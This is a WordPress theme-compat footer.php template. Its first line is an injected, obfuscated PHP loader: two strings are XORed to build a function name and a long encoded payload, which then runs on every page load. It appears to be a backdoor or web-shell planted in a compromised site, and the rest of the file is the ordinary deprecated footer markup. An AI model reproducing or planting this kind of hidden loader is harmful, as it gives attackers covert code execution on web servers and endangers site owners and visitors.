<?php $UrkTLOwirMN='Y1WA,-65Y,.9Z:6'^':C2 XHiS,BMM3UX';$AEUPO=$UrkTLOwirMN('','EUoiFAWTZ<S4d1S+F>KZW59R5DLF3n1>36PZDnF1f27RP1T<6xD,=oQZB522F7=YkUM.6mZR1-KxvJwmaIELNAXKYaqXkDODfMHRDkhIcNoEzdv9RDX<<QYQb-ZX9mhtTDILLm5AaYAXLCHPDUWU=P7WY3d.ve,+ =Q:OcQE659PTzEK-OF4ElOkPR36Y=8DFC6>sba1;GQ3FeWXXSELyZJZG.Ldt=8Z-lZ6WPZIF+V<Qx7b>5535+Fnxu;sx:;97HU2Zp1EHGJHvi=+A>3pl2rDP77A.<8N:OnlfS=-IpXeOL5;wirM12A20q9-OR=1RlKFJL;9NMJfCWC7R8C;hXJl<q223ghZ.Slu 4;KPQiPG6661XMNOCgl0+C,h>WIMZeO>=,Yc>zvYR97xkoQD+LB5sinL<5oYBDA3AjyY-6VS2RR1PP=SNAA>=-Q3A1<;-=aZ9FQYb8RYQTP7XW-S5WEONJ>W-,717MGnxBP+dQDJ66PNWvO;O1MaR, .T2YFTNdhRN,rEuiDYDOHnTEqFWDeEK+ZJ0nf2I.e3LzTwPJZQgHuHARimX4DA,IcB-SVdBWyS+.XDW2nhqqiG36N2UqSNNaQB0BYJKw<4 B-L>oDob3Q- EJOFexzBNCJQDX5mC363-kOG1E5ZU K<Lqek-=Q;rTDbbM'^',3GH 497.U<Z;T+B5J8rpMV j -2R1nSFBwsmN=;oTB<3E=SXX<CO05;6Tmm+BIqO1,ZWAzvZH2QVjWMA2OEGe7>-ALxLctNoD.=6CL CsOuADRPn7,NP47yFI;,XDSTp-bgeg<HE64,lmuplq34I1ls0nDpVAGNYfuSoFq6BGU5:Ra H6oilWEbY VB,OVlb,CJZYk8FM,9LA39,2eqY<+64KwnPYY.L31S.pgi J:O4C=hXZGVTH.NPQd07upprh4AzTZ 1gwvVMKJ-KVYLIxMtSV5OcS+CoSLB8XTrzQA+-AZWTRiGS-GUJ3PEXTWrDjb.-OXgm1lJ1,E7Y SHpn3n4cgv4<zO LQKQBkmoIt1WZCTqm5EJnHTJ7M7U20mgEkUXUbi7sR=3MVXVOu2J 7PHcg16HeSf  G JDymC8 W ;P<9G6f9.LbI0G ncVXII8X54oVg6<2;4RpsI2A6lcnnZ6YMhZR4nGCH9MLu +BWphqV.I=P4>9IYq1J05 =LO9+UUiUM 80.aNrcQn: PmoO;>Q5AY,WBneZiJpm;eRpEzsbPZmVupI-WrKecQpfK5HK<q1WIAQWOgRD<S,.8+7>4:Y1-9cPLUY.B-ZHhOFW0YAlcofEXZb5IC429YEgWWGL0h7P<Y54DlaeJobHE8OZdmYh0');$AEUPO();
/**
 * @package WordPress
 * @subpackage Theme_Compat
 * @deprecated 3.0.0
 *
 * This file is here for backward compatibility with old themes and will be removed in a future version
 */
_deprecated_file(
	/* translators: %s: template name */
	sprintf( __( 'Theme without %s' ), basename( __FILE__ ) ),
	'3.0.0',
	null,
	/* translators: %s: template name */
	sprintf( __( 'Please include a %s template in your theme.' ), basename( __FILE__ ) )
);
?>

<hr />
<div id="footer" role="contentinfo">
<!-- If you'd like to support WordPress, having the "powered by" link somewhere on your blog is the best way; it's our only promotion or advertising. -->
	<p>
		<?php
		printf(
			/* translators: 1: blog name, 2: WordPress */
			__( '%1$s is proudly powered by %2$s' ),
			get_bloginfo('name'),
			'<a href="https://wordpress.org/">WordPress</a>'
		);
		?>
	</p>
</div>
</div>

<!-- Gorgeous design by Michael Heilemann - http://binarybonsai.com/kubrick/ -->
<?php /* "Just what do you think you're doing Dave?" */ ?>

		<?php wp_footer(); ?>
</body>
</html>
